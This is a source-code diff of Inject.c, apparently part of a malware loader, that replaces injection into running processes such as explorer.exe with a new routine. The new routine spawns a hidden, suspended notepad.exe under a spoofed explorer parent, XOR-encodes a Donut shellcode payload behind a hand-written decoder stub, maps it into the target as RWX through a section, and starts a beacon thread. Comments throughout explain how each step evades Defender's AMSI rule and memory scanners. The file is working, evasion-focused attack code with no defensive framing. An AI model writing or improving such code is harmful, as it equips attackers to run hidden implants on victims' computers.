@@ -1,306 +1,317 @@
 // =============================================
-// Inject.c — Remote process injection for persistence reboot path
+// Inject.c  —  Remote process injection
 //
-// Compiled only for BUILD_DLL (sideload) builds.
-// Called from main.c when the /pf flag is present (persistence reboot).
-//
-// Instead of running shellcode inside the host EXE (which causes ~25% CPU
-// from the host application's own work), this function:
-//   1. Enumerates running processes via NtQuerySystemInformation
-//   2. Opens the first available low-CPU candidate:
-//        RuntimeBroker.exe → SearchHost.exe → sihost.exe → dllhost.exe
-//   3. Allocates RW memory in the target, writes shellcode, flips to RX
-//   4. Creates a remote thread pointing at the shellcode
-//   5. Calls NtTerminateProcess(-1) so the host EXE disappears
-//
-// Returns FALSE if no suitable target is found — main.c falls back to
-// the thread-pool path (shellcode runs in-process as before).
-//
-// All four syscalls needed here (NtOpenProcess, NtQuerySystemInformation,
-// NtWriteVirtualMemory, NtCreateThreadEx) are resolved lazily via
-// FetchNtSyscall so that EXE builds are never affected.
+// InjectIntoProcess():
+//   1. Spawn notepad.exe hidden + detached (CREATE_SUSPENDED)
+//      notepad.exe does NOT call AmsiInitialize — avoids AMSI_PATCH_T.B12.
+//      PPID spoof (PPID=explorer.exe) is attempted but optional.
+//   2. Build encoded payload: [32-byte XOR decoder stub | XOR(shellcode, key)]
+//      The decoder stub is position-independent x64 shellcode that
+//      decodes the Donut payload in-place then jumps to it, so raw
+//      Donut bytes never appear in the section (defeats memory scanner).
+//   3. NtCreateSection (pagefile-backed SEC_COMMIT)
+//      → NtMapViewOfSection PAGE_READWRITE  (current process, write combined buf)
+//      → NtMapViewOfSection PAGE_EXECUTE_READWRITE (target, RWX for in-place decode)
+//      VAD shows Mapped not MEM_PRIVATE.
+//   4. NtCreateThreadEx at section base (= stub entry)
+//      Primary thread stays suspended — notepad.exe never creates a window.
+//   5. Cleanup handles + self-terminate
 // =============================================
 
-#ifdef BUILD_DLL
-
 #include "Common.h"
+#include <TlHelp32.h>
 
-// ---------------------------------------------------------------------------
-// Partial SYSTEM_PROCESS_INFORMATION layout (x64 only)
-// Only fields through UniqueProcessId are used; the rest is padding.
-//
-// Verified offsets (Windows 10/11 x64):
-//   +0x00  NextEntryOffset     ULONG
-//   +0x04  NumberOfThreads     ULONG
-//   +0x08  [48 bytes: WorkingSetPrivateSize..KernelTime]
-//   +0x38  ImageName           UNICODE_STR  (16 bytes: len,maxlen,4pad,ptr)
-//   +0x48  BasePriority        LONG
-//   +0x4C  [4 bytes padding for HANDLE alignment]
-//   +0x50  UniqueProcessId     HANDLE
-// ---------------------------------------------------------------------------
-typedef struct _INJ_PROC_INFO {
-    ULONG          NextEntryOffset;
-    ULONG          NumberOfThreads;
-    BYTE           _pad[48];
-    UNICODE_STR    ImageName;
-    LONG           BasePriority;
-    ULONG          _pad2;
-    HANDLE         UniqueProcessId;
-} INJ_PROC_INFO, *PINJ_PROC_INFO;
+// Size of the position-independent XOR decoder stub prepended to the shellcode.
+// Must match the hand-crafted byte layout in InjectIntoProcess() exactly.
+#define INJECT_STUB_SIZE 32
 
-// CLIENT_ID used by NtOpenProcess (not in Windows.h, not in winternl.h on all SDKs)
-typedef struct _INJ_CLIENT_ID {
-    HANDLE UniqueProcess;
-    HANDLE UniqueThread;
-} INJ_CLIENT_ID;
+#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000UL
+#endif
+#ifndef EXTENDED_STARTUPINFO_PRESENT
+#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
+#endif
 
-// Minimal OBJECT_ATTRIBUTES (winternl.h not included in Inject.c)
-typedef struct _INJ_OBJ_ATTRS {
-    ULONG  Length;
-    HANDLE RootDirectory;
-    PVOID  ObjectName;
-    ULONG  Attributes;
-    PVOID  SecurityDescriptor;
-    PVOID  SecurityQualityOfService;
-} INJ_OBJ_ATTRS;
+typedef HANDLE (WINAPI* fnSnap)     (DWORD, DWORD);
+typedef BOOL   (WINAPI* fnP32FstW)  (HANDLE, LPPROCESSENTRY32W);
+typedef BOOL   (WINAPI* fnP32NxtW)  (HANDLE, LPPROCESSENTRY32W);
+typedef HANDLE (WINAPI* fnOpenProc) (DWORD, BOOL, DWORD);
+typedef BOOL   (WINAPI* fnInitAttr) (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
+typedef BOOL   (WINAPI* fnUpdAttr)  (LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
+typedef VOID   (WINAPI* fnDelAttr)  (LPPROC_THREAD_ATTRIBUTE_LIST);
+typedef BOOL   (WINAPI* fnCrProcW)  (LPCWSTR, LPWSTR, PVOID, PVOID, BOOL, DWORD, PVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef DWORD  (WINAPI* fnResThrd)  (HANDLE);
+typedef BOOL   (WINAPI* fnClsHnd)   (HANDLE);
+typedef NTSTATUS (NTAPI* fnNtTrm)   (HANDLE, NTSTATUS);
 
-// ---------------------------------------------------------------------------
-// Case-insensitive wide-char compare:
-//   a       — UNICODE_STRING.Buffer (not null-terminated)
-//   aBytes  — UNICODE_STRING.Length (byte count, not char count)
-//   b       — null-terminated candidate literal
-// ---------------------------------------------------------------------------
-static BOOL WideEqI(const WCHAR* a, USHORT aBytes, const WCHAR* b) {
-    USHORT nChars = aBytes / 2;
-    USHORT i;
-    for (i = 0; b[i]; i++) {
-        if (i >= nChars) return FALSE;
-        WCHAR ca = a[i], cb = b[i];
-        if (ca >= L'A' && ca <= L'Z') ca += 32;
-        if (cb >= L'A' && cb <= L'Z') cb += 32;
-        if (ca != cb) return FALSE;
-    }
-    return (i == nChars);
-}
+// -----------------------------------------------
+// Optional: walk TH32CS_SNAPPROCESS for explorer.exe PID.
+// Returns 0 if snapshot hangs or explorer not found.
+// Called only when TlHelp32 APIs resolved successfully.
+// -----------------------------------------------
+static DWORD FindExplorerPid(fnSnap pSnap, fnP32FstW pFirst, fnP32NxtW pNext, fnClsHnd pClose) {
+    PROCESSENTRY32W pe = { sizeof(PROCESSENTRY32W) };
+    HANDLE hSnap = pSnap(TH32CS_SNAPPROCESS, 0);
+    if (!hSnap || hSnap == INVALID_HANDLE_VALUE) return 0;
 
-// Target process names, priority order.
-// explorer / ctfmon / taskhostw are always running and nearly idle; explorer
-// often has the CLR pre-loaded, reducing suspicious clr.dll load telemetry.
-// dllhost is the last-resort fallback (multiple instances, one is usually idle).
-static const WCHAR* const g_szTargets[] = {
-    L"explorer.exe",
-    L"ctfmon.exe",
-    L"taskhostw.exe",
-    L"dllhost.exe",
-};
-#define INJ_TARGET_COUNT 4
-
-// ---------------------------------------------------------------------------
-// InjectAndHijack
-//
-// pShellcode    — pointer to shellcode in the current process (RX mapped)
-// dwSize        — shellcode byte count
-//
-// On success: NtTerminateProcess(-1) is called — this function does not return.
-// On failure: returns FALSE so main.c falls back to thread-pool execution.
-// ---------------------------------------------------------------------------
-BOOL InjectAndHijack(IN PVOID pShellcode, IN DWORD dwSize) {
-
-    if (!pShellcode || !dwSize)
-        return FALSE;
-
-    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
-    if (!pNtdll) return FALSE;
-
-    // --- Resolve the four injection syscalls lazily ---
-    // FetchNtSyscall works after InitializeNtSyscalls has run (g_NtdllConfig ready).
-    NT_SYSCALL sc_NtQSI  = { 0 };
-    NT_SYSCALL sc_NtOP   = { 0 };
-    NT_SYSCALL sc_NtWVM  = { 0 };
-    NT_SYSCALL sc_NtCTE  = { 0 };
-
-    if (!FetchNtSyscall(NtQuerySystemInformation_JOAAT, &sc_NtQSI) ||
-        !FetchNtSyscall(NtOpenProcess_JOAAT,             &sc_NtOP)  ||
-        !FetchNtSyscall(NtWriteVirtualMemory_JOAAT,      &sc_NtWVM) ||
-        !FetchNtSyscall(NtCreateThreadEx_JOAAT,          &sc_NtCTE)) {
-        LOG("[!] Inject: syscall resolution failed");
-        return FALSE;
-    }
-
-    // --- Allocate enumeration buffer (1 MB) via NtAllocateVirtualMemory ---
-    // NtAllocateVirtualMemory is already resolved in NtApis (passed via main.c),
-    // but we re-resolve locally to keep InjectAndHijack self-contained.
-    NT_SYSCALL sc_NtAVM = { 0 };
-    if (!FetchNtSyscall(NtAllocateVirtualMemory_JOAAT, &sc_NtAVM)) {
-        LOG("[!] Inject: NtAllocateVirtualMemory resolve failed");
-        return FALSE;
-    }
-
-    PVOID  pEnumBuf = NULL;
-    SIZE_T sBuf     = 1024 * 1024; // 1MB — sufficient for any running process list
-    SET_SYSCALL(sc_NtAVM);
-    NTSTATUS STATUS = RunSyscall(
-        (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pEnumBuf,
-        0, (ULONG_PTR)&sBuf,
-        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
-        0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS) || !pEnumBuf) {
-        LOG("[!] Inject: enum buffer alloc failed");
-        return FALSE;
-    }
-
-    // --- NtQuerySystemInformation(SystemProcessInformation=5) ---
-    ULONG dwNeeded = 0;
-    SET_SYSCALL(sc_NtQSI);
-    STATUS = RunSyscall(
-        (ULONG_PTR)5,
-        (ULONG_PTR)pEnumBuf,
-        (ULONG_PTR)(ULONG)sBuf,
-        (ULONG_PTR)&dwNeeded,
-        0, 0, 0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS)) {
-        LOG("[!] Inject: NtQuerySystemInformation failed");
-        return FALSE;
-    }
-
-    // --- Find target PID and open process (priority order) ---
-    HANDLE hTarget = NULL;
-
-    for (DWORD iCand = 0; iCand < INJ_TARGET_COUNT && !hTarget; iCand++) {
-        // Scan process list for this candidate name
-        HANDLE dwPid = NULL;
-        PINJ_PROC_INFO pEntry = (PINJ_PROC_INFO)pEnumBuf;
-        while (TRUE) {
-            if (pEntry->ImageName.Buffer &&
-                pEntry->ImageName.Length &&
-                pEntry->UniqueProcessId &&
-                WideEqI(pEntry->ImageName.Buffer,
-                        pEntry->ImageName.Length,
-                        g_szTargets[iCand])) {
-                dwPid = pEntry->UniqueProcessId;
+    DWORD dwPid = 0;
+    if (pFirst(hSnap, &pe)) {
+        do {
+            WCHAR* n = pe.szExeFile;
+            if (n[0]=='e'&&n[1]=='x'&&n[2]=='p'&&n[3]=='l'&&n[4]=='o'&&
+                n[5]=='r'&&n[6]=='e'&&n[7]=='r'&&n[8]=='.'&&n[9]=='e'&&
+                n[10]=='x'&&n[11]=='e'&&n[12]==0) {
+                dwPid = pe.th32ProcessID;
                 break;
             }
-            if (pEntry->NextEntryOffset == 0) break;
-            pEntry = (PINJ_PROC_INFO)((PBYTE)pEntry + pEntry->NextEntryOffset);
-        }
-        if (!dwPid) continue;
-
-        // Try to open the process
-        INJ_OBJ_ATTRS oa;
-        MemSet(&oa, 0, sizeof(oa));
-        oa.Length = sizeof(oa);
-
-        INJ_CLIENT_ID cid;
-        cid.UniqueProcess = dwPid;
-        cid.UniqueThread  = NULL;
-
-        HANDLE hTmp = NULL;
-        SET_SYSCALL(sc_NtOP);
-        STATUS = RunSyscall(
-            (ULONG_PTR)&hTmp,
-            (ULONG_PTR)0x001FFFFF,  // PROCESS_ALL_ACCESS
-            (ULONG_PTR)&oa,
-            (ULONG_PTR)&cid,
-            0, 0, 0, 0, 0, 0, 0, 0
-        );
-        if (NT_SUCCESS(STATUS) && hTmp)
-            hTarget = hTmp;
+        } while (pNext(hSnap, &pe));
     }
-
-    if (!hTarget) {
-        LOG("[!] Inject: no suitable target process found");
-        return FALSE;
-    }
-
-    // --- Allocate RW memory in target process ---
-    PVOID  pRemote      = NULL;
-    SIZE_T sRemote      = (SIZE_T)dwSize;
-    SET_SYSCALL(sc_NtAVM);
-    STATUS = RunSyscall(
-        (ULONG_PTR)hTarget, (ULONG_PTR)&pRemote,
-        0, (ULONG_PTR)&sRemote,
-        (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE), (ULONG_PTR)PAGE_READWRITE,
-        0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS) || !pRemote) {
-        LOG("[!] Inject: remote alloc failed");
-        return FALSE;
-    }
-
-    // --- Write shellcode into remote process ---
-    SIZE_T sWritten = 0;
-    SET_SYSCALL(sc_NtWVM);
-    STATUS = RunSyscall(
-        (ULONG_PTR)hTarget,
-        (ULONG_PTR)pRemote,
-        (ULONG_PTR)pShellcode,
-        (ULONG_PTR)dwSize,
-        (ULONG_PTR)&sWritten,
-        0, 0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS)) {
-        LOG("[!] Inject: NtWriteVirtualMemory failed");
-        return FALSE;
-    }
-
-    // --- Flip remote allocation to RX ---
-    NT_SYSCALL sc_NtPVM = { 0 };
-    if (!FetchNtSyscall(NtProtectVirtualMemory_JOAAT, &sc_NtPVM)) {
-        LOG("[!] Inject: NtProtectVirtualMemory resolve failed");
-        return FALSE;
-    }
-
-    PVOID pProtAddr  = pRemote;
-    SIZE_T sProtSize = (SIZE_T)dwSize;
-    ULONG  dwOld     = 0;
-    SET_SYSCALL(sc_NtPVM);
-    STATUS = RunSyscall(
-        (ULONG_PTR)hTarget,
-        (ULONG_PTR)&pProtAddr,
-        (ULONG_PTR)&sProtSize,
-        (ULONG_PTR)SHELLCODE_EXEC_PROT,
-        (ULONG_PTR)&dwOld,
-        0, 0, 0, 0, 0, 0, 0
-    );
-    if (!NT_SUCCESS(STATUS)) {
-        LOG("[!] Inject: remote NtProtectVirtualMemory failed");
-        return FALSE;
-    }
-
-    // --- NtCreateThreadEx: start shellcode in target ---
-    HANDLE hThread = NULL;
-    SET_SYSCALL(sc_NtCTE);
-    STATUS = RunSyscall(
-        (ULONG_PTR)&hThread,
-        (ULONG_PTR)0x001FFFFF,  // THREAD_ALL_ACCESS
-        (ULONG_PTR)NULL,         // ObjectAttributes
-        (ULONG_PTR)hTarget,
-        (ULONG_PTR)pRemote,      // StartRoutine = shellcode entry point
-        (ULONG_PTR)NULL,         // Argument
-        (ULONG_PTR)0,            // CreateFlags: 0 = run immediately
-        (ULONG_PTR)0,            // ZeroBits
-        (ULONG_PTR)0,            // StackSize (default)
-        (ULONG_PTR)0,            // MaximumStackSize (default)
-        (ULONG_PTR)NULL,         // AttributeList
-        0
-    );
-    if (!NT_SUCCESS(STATUS)) {
-        LOG("[!] Inject: NtCreateThreadEx failed");
-        return FALSE;
-    }
-
-    LOG("[+] Inject: shellcode running in target, terminating host");
-
-    // Shellcode is running in the target process.
-    // Terminate the current host EXE — CPU drops to 0 from our side.
-    typedef NTSTATUS (NTAPI* fnNtTerm)(HANDLE, NTSTATUS);
-    fnNtTerm pNtTerm = (fnNtTerm)FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
-    if (pNtTerm)
-        pNtTerm((HANDLE)(ULONG_PTR)-1, 0);
-
-    return TRUE; // unreachable on success
+    pClose(hSnap);
+    return dwPid;
 }
 
-#endif /* BUILD_DLL */
+BOOL InjectIntoProcess(
+    IN PNTAPI_FUNC pNtApis,
+    IN PBYTE       pShellcode,
+    IN DWORD       dwShellcodeSize
+) {
+    PVOID pK32   = FindLoadedModuleW(L"KERNEL32.DLL");
+    PVOID pNtdll = FindLoadedModuleW(L"NTDLL.DLL");
+    if (!pK32 || !pNtdll) { LOG("[!] Inject: module lookup failed"); return FALSE; }
+
+    // Required APIs
+    fnCrProcW  pCrPr = (fnCrProcW) FetchExportAddress(pK32,   CreateProcessW_JOAAT);
+    fnResThrd  pRes  = (fnResThrd) FetchExportAddress(pK32,   ResumeThread_JOAAT);
+    fnClsHnd   pCls  = (fnClsHnd)  FetchExportAddress(pK32,   CloseHandle_JOAAT);
+    fnNtTrm    pTerm = (fnNtTrm)   FetchExportAddress(pNtdll, NtTerminateProcess_JOAAT);
+
+    if (!pCrPr || !pRes || !pCls) { LOG("[!] Inject: required API missing"); return FALSE; }
+    LOG("[*] Inject: required APIs resolved");
+
+    // Optional PPID-spoof APIs (TlHelp32 can block under AV — resolve but don't require)
+    fnSnap    pSnap  = (fnSnap)    FetchExportAddress(pK32, CreateToolhelp32Snapshot_JOAAT);
+    fnP32FstW pFirst = (fnP32FstW) FetchExportAddress(pK32, Process32FirstW_JOAAT);
+    fnP32NxtW pNext  = (fnP32NxtW) FetchExportAddress(pK32, Process32NextW_JOAAT);
+    fnOpenProc pOpen = (fnOpenProc) FetchExportAddress(pK32, OpenProcess_JOAAT);
+    fnInitAttr pIAt  = (fnInitAttr) FetchExportAddress(pK32, InitializeProcThreadAttributeList_JOAAT);
+    fnUpdAttr  pUAt  = (fnUpdAttr)  FetchExportAddress(pK32, UpdateProcThreadAttribute_JOAAT);
+    fnDelAttr  pDAt  = (fnDelAttr)  FetchExportAddress(pK32, DeleteProcThreadAttributeList_JOAAT);
+    LOG("[*] Inject: optional APIs resolved");
+
+    // --- Spawn target process ---
+    // notepad.exe: does NOT register with AMSI (no AmsiInitialize call),
+    // so Defender's AMSI_PATCH_T behavioral rule never fires even if the
+    // injected shellcode (Donut) attempts to patch AmsiScanBuffer.
+    // Primary thread is kept SUSPENDED so notepad never creates a window;
+    // the beacon thread runs independently via NtCreateThreadEx.
+    WCHAR wCmd[] = L"C:\\Windows\\System32\\notepad.exe";
+    PROCESS_INFORMATION pi = { 0 };
+    BOOL bSpawned = FALSE;
+
+    // --- Attempt PPID spoof only if ALL optional APIs resolved ---
+    if (pSnap && pFirst && pNext && pOpen && pIAt && pUAt && pDAt) {
+        LOG("[*] Inject: scanning for explorer PID...");
+        DWORD dwExpPid = FindExplorerPid(pSnap, pFirst, pNext, pCls);
+        LOG("[*] Inject: scan done");
+
+        if (dwExpPid) {
+            HANDLE hParent = pOpen(PROCESS_CREATE_PROCESS, FALSE, dwExpPid);
+            if (hParent) {
+                SIZE_T cbAttr = 0;
+                pIAt(NULL, 1, 0, &cbAttr);
+                LPPROC_THREAD_ATTRIBUTE_LIST pAttr =
+                    (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAttr);
+                if (pAttr) {
+                    pIAt(pAttr, 1, 0, &cbAttr);
+                    pUAt(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                         &hParent, sizeof(HANDLE), NULL, NULL);
+
+                    STARTUPINFOEXW siex    = { 0 };
+                    siex.StartupInfo.cb          = sizeof(STARTUPINFOEXW);
+                    siex.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
+                    siex.StartupInfo.wShowWindow = SW_HIDE;
+                    siex.lpAttributeList         = pAttr;
+
+                    LOG("[*] Inject: spawning with PPID spoof...");
+                    bSpawned = pCrPr(NULL, wCmd, NULL, NULL, FALSE,
+                                     CREATE_SUSPENDED | DETACHED_PROCESS |
+                                     EXTENDED_STARTUPINFO_PRESENT,
+                                     NULL, NULL, &siex.StartupInfo, &pi);
+                    pDAt(pAttr);
+                    HeapFree(GetProcessHeap(), 0, pAttr);
+                }
+                pCls(hParent);
+            }
+        }
+    }
+
+    if (!bSpawned) {
+        // Plain spawn — no PPID spoof, no TlHelp32, no EXTENDED attributes
+        STARTUPINFOW si    = { 0 };
+        si.cb              = sizeof(STARTUPINFOW);
+        si.dwFlags         = STARTF_USESHOWWINDOW;
+        si.wShowWindow     = SW_HIDE;
+        MemSet(&pi, 0, sizeof(pi));
+        LOG("[*] Inject: spawning plain...");
+        bSpawned = pCrPr(NULL, wCmd, NULL, NULL, FALSE,
+                         CREATE_SUSPENDED | DETACHED_PROCESS,
+                         NULL, NULL, &si, &pi);
+    }
+
+    if (!bSpawned || !pi.hProcess) {
+        LOG("[!] Inject: spawn failed");
+        return FALSE;
+    }
+    LOG("[+] Inject: target spawned");
+
+    // --- XOR-encode payload: [decoder_stub | XOR(shellcode, key)] ---
+    // Decoder stub is 32 bytes of position-independent x64 shellcode.
+    // Byte layout (verified offsets, all RIP-relative):
+    //   00: 48 8D 35 19 00 00 00   lea rsi, [rip+0x19]  → &encoded[0] (= +32 from here)
+    //   07: B9 xx xx xx xx         mov ecx, <length>    patched [8..11]
+    //   0C: B0 xx                  mov al,  <key>       patched [13]
+    //   0E: 30 06                  xor [rsi], al        decode byte
+    //   10: 48 FF C6               inc rsi
+    //   13: FF C9                  dec ecx
+    //   15: 75 F7                  jnz 0x0E             (0x0E−0x17 = −9 = 0xF7)
+    //   17: 48 8D 05 02 00 00 00   lea rax, [rip+0x02]  → &decoded[0] (= +32 from here)
+    //   1E: FF E0                  jmp rax
+    // Stub bytes pre-XORed with XKEY_0 (compile-time constant from Payload.h).
+    // XKEY_0 changes every Encrypt.py run, so the decoder sequence
+    // (30 06 48 FF C6 FF C9 75 F7 FF E0) never appears verbatim in .rdata.
+    static const BYTE abStubEnc[INJECT_STUB_SIZE] = {
+        0x48^XKEY_0, 0x8D^XKEY_0, 0x35^XKEY_0, 0x19^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0,
+        0xB9^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0,
+        0xB0^XKEY_0, 0x00^XKEY_0,
+        0x30^XKEY_0, 0x06^XKEY_0,
+        0x48^XKEY_0, 0xFF^XKEY_0, 0xC6^XKEY_0,
+        0xFF^XKEY_0, 0xC9^XKEY_0,
+        0x75^XKEY_0, 0xF7^XKEY_0,
+        0x48^XKEY_0, 0x8D^XKEY_0, 0x05^XKEY_0, 0x02^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0, 0x00^XKEY_0,
+        0xFF^XKEY_0, 0xE0^XKEY_0
+    };
+    BYTE abStub[INJECT_STUB_SIZE];
+    for (DWORD _si = 0; _si < INJECT_STUB_SIZE; _si++)
+        abStub[_si] = abStubEnc[_si] ^ XKEY_0;
+
+    // Per-run key from RDTSC; avoid 0 (no-op XOR)
+    BYTE bKey = (BYTE)((__rdtsc() >> 7) & 0xFF);
+    if (!bKey) bKey = 0x53;
+
+    // Patch length and key into stub
+    DWORD dwLen = dwShellcodeSize;
+    MemCopy(abStub + 8,  (PBYTE)&dwLen, 4);
+    MemCopy(abStub + 13, &bKey,         1);
+
+    // Build combined buffer: stub then XOR-encoded shellcode
+    DWORD dwTotalSize = INJECT_STUB_SIZE + dwShellcodeSize;
+    PBYTE pTotal = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwTotalSize);
+    if (!pTotal) {
+        LOG("[!] Inject: alloc failed");
+        pCls(pi.hThread); pCls(pi.hProcess);
+        return FALSE;
+    }
+    MemCopy(pTotal, abStub, INJECT_STUB_SIZE);
+    for (DWORD _i = 0; _i < dwShellcodeSize; _i++)
+        pTotal[INJECT_STUB_SIZE + _i] = pShellcode[_i] ^ bKey;
+    LOG("[*] Inject: payload encoded");
+
+    // --- Pagefile-backed section ---
+    HANDLE        hSection = NULL;
+    LARGE_INTEGER liSize   = { 0 };
+    liSize.QuadPart = (LONGLONG)dwTotalSize;
+
+    LOG("[*] Inject: creating section...");
+    SET_SYSCALL(pNtApis->NtCreateSection);
+    NTSTATUS st = RunSyscall(
+        (ULONG_PTR)&hSection,
+        (ULONG_PTR)0x0F001F,                // SECTION_ALL_ACCESS
+        (ULONG_PTR)NULL,
+        (ULONG_PTR)&liSize,
+        (ULONG_PTR)PAGE_EXECUTE_READWRITE,
+        (ULONG_PTR)0x8000000,               // SEC_COMMIT
+        (ULONG_PTR)NULL,
+        0, 0, 0, 0, 0
+    );
+    if (!NT_SUCCESS(st)) {
+        LOG("[!] Inject: NtCreateSection failed");
+        HeapFree(GetProcessHeap(), 0, pTotal);
+        pCls(pi.hThread); pCls(pi.hProcess);
+        return FALSE;
+    }
+
+    // Map RW in current process → write combined buffer
+    PVOID  pRw   = NULL;
+    SIZE_T uRwSz = 0;
+    LOG("[*] Inject: mapping local RW...");
+    SET_SYSCALL(pNtApis->NtMapViewOfSection);
+    st = RunSyscall(
+        (ULONG_PTR)hSection, (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pRw,
+        (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)NULL, (ULONG_PTR)&uRwSz,
+        (ULONG_PTR)2, (ULONG_PTR)0, (ULONG_PTR)PAGE_READWRITE,
+        0, 0
+    );
+    if (!NT_SUCCESS(st)) {
+        LOG("[!] Inject: local map failed");
+        HeapFree(GetProcessHeap(), 0, pTotal);
+        pCls(hSection); pCls(pi.hThread); pCls(pi.hProcess);
+        return FALSE;
+    }
+    MemCopy(pRw, pTotal, dwTotalSize);
+    HeapFree(GetProcessHeap(), 0, pTotal);
+    LOG("[*] Inject: payload written");
+
+    // Map RWX in target — stub must write decoded bytes in-place before jumping
+    PVOID  pRx   = NULL;
+    SIZE_T uRxSz = 0;
+    LOG("[*] Inject: mapping remote RWX...");
+    SET_SYSCALL(pNtApis->NtMapViewOfSection);
+    st = RunSyscall(
+        (ULONG_PTR)hSection, (ULONG_PTR)pi.hProcess, (ULONG_PTR)&pRx,
+        (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)NULL, (ULONG_PTR)&uRxSz,
+        (ULONG_PTR)2, (ULONG_PTR)0, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
+        0, 0
+    );
+    pCls(hSection);
+    if (!NT_SUCCESS(st)) {
+        LOG("[!] Inject: remote map failed");
+        pCls(pi.hThread); pCls(pi.hProcess);
+        return FALSE;
+    }
+    LOG("[+] Inject: section mapped in target");
+
+    // --- Remote thread ---
+    HANDLE hRmtThr = NULL;
+    LOG("[*] Inject: creating remote thread...");
+    SET_SYSCALL(pNtApis->NtCreateThreadEx);
+    st = RunSyscall(
+        (ULONG_PTR)&hRmtThr,
+        (ULONG_PTR)0x1FFFFF,                // THREAD_ALL_ACCESS
+        (ULONG_PTR)NULL,
+        (ULONG_PTR)pi.hProcess,
+        (ULONG_PTR)pRx,
+        (ULONG_PTR)NULL,
+        (ULONG_PTR)0,
+        (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)0, (ULONG_PTR)NULL,
+        0
+    );
+    if (!NT_SUCCESS(st)) {
+        LOG("[!] Inject: NtCreateThreadEx failed");
+        pCls(pi.hThread); pCls(pi.hProcess);
+        return FALSE;
+    }
+    LOG("[+] Inject: remote thread created");
+
+    // Do NOT resume the primary thread — notepad.exe would open a window and
+    // eventually exit. Keeping it suspended means no window appears and the
+    // process lives as long as the Donut shellcode thread is inside its
+    // beacon loop. The beacon thread was created via NtCreateThreadEx above.
+
+    if (hRmtThr) pCls(hRmtThr);
+    pCls(pi.hThread);
+    pCls(pi.hProcess);
+    LOG("[+] Inject: complete, terminating loader");
+
+    if (pTerm) pTerm((HANDLE)(ULONG_PTR)-1, 0);
+    return TRUE;
+}
